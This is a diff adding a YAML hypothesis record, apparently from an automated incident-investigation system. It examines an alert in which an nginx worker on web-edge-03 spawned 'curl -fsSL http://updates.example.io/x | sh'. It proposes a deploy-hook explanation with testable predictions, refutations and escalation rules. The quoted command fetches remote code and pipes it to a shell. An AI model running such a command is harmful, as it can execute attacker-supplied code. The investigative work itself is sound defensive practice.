@@ -1,0 +1,68 @@
+```yaml
+predict:
+  loop: 1
+  shape: A
+
+  hypotheses:
+    - id: h-001
+      name: "?deploy-hook-execution"
+      attached_to_vertex: v-002
+      proposed_edge:
+        relation: spawned
+        parent_vertex:
+          type: process
+          classification: "deploy-orchestrated-nginx-worker"
+      story: |
+        A deployment orchestrator (CI runner, capistrano, ansible, or equivalent)
+        active on web-edge-03 triggered nginx worker pid 1422 to execute a
+        post-deploy bootstrap step at 03:11:07Z; the step invokes
+        `curl -fsSL http://updates.example.io/x | sh` to pull and run an
+        artifact from a sanctioned delivery endpoint named updates.example.io.
+        Deploy hooks of this shape — remote fetch piped to sh — appear in
+        automated update workflows where the delivery URL is fixed in deploy
+        configuration. If this is an authorized deploy, the process ancestry
+        above nginx pid 1422 will include a deploy-tooling process, and
+        deploy-runs-api will show a concurrent run targeting this host.
+        No prior baseline exists for this signature on web-edge-03.
+      predictions:
+        - id: p1
+          subject: proposed_edge
+          claim: "deploy-runs-api records a run targeting web-edge-03 (or 10.0.7.18) whose execution window contains the alert timestamp"
+          from_story_link: "deployment orchestrator active on web-edge-03 triggered nginx worker pid 1422 at 03:11:07Z"
+        - id: p2
+          subject: proposed_edge
+          claim: "the matching deploy run's configuration or script body names updates.example.io as a delivery endpoint"
+          from_story_link: "pull and run an artifact from a sanctioned delivery endpoint named updates.example.io"
+      attribute_predictions:
+        - id: ap1
+          target: proposed_parent
+          attribute: proc_ancestry
+          claim: "the ancestry chain of nginx pid 1422 above the nginx master contains at least one deploy-tooling process class (CI runner, orchestrator daemon, or equivalent)"
+      refutation_shape:
+        - id: r1
+          refutes_predictions: [p1]
+          claim: "no deploy-runs-api record's execution window contains the alert timestamp for this host"
+        - id: r2
+          refutes_predictions: [p2]
+          claim: "a matching run exists but its configuration and script body do not name updates.example.io as a delivery endpoint"
+        - id: r3
+          refutes_predictions: [ap1]
+          claim: "the ancestry chain above nginx pid 1422 contains only system-init and nginx-master with no deploy-tooling process class anywhere in the chain"
+      authorization_contract:
+        - id: ac1
+          edge_ref: proposed
+          anchor_kind: deploy-runs
+          predicate: "authorized iff a deploy run targeting web-edge-03 was active at the alert timestamp AND its configuration names updates.example.io as a sanctioned delivery endpoint"
+          on_unauthorized: escalate
+          on_indeterminate: escalate
+      integrity_waived: "deploy-runs records the initiating identity (human operator, scheduled trigger, or CI webhook) that opened the run; confirming the run authorizes the action and identifies the responsible actor in one resolution."
+      weight: null
+
+  routing:
+    selected_lead: process-lineage
+    composite_secondary: [deploy-runs-correlation]
+    override_data_source: null
+    lead_hints:
+      process-lineage: "Reconstruct the full ancestry chain for pid 31807 (sh, cmdline: sh -c 'curl -fsSL http://updates.example.io/x | sh') and its parent nginx pid 1422 on web-edge-03 (10.0.7.18) at 2026-04-26T03:11:07Z. Walk the chain from pid 31807 upward to PID 1, noting every process name, cmdline, and user at each level. Flag any deploy-tooling process class (CI runner, capistrano, ansible, orchestrator daemon) in the chain."
+      deploy-runs-correlation: "Query the deploy-runs API for any deployment targeting web-edge-03 or IP 10.0.7.18 with a window covering 2026-04-26T03:11:07Z (suggest ±30 minutes). For any matching run, check whether updates.example.io appears in the run's script body, configuration, or artifact manifests as a sanctioned delivery endpoint."
+```
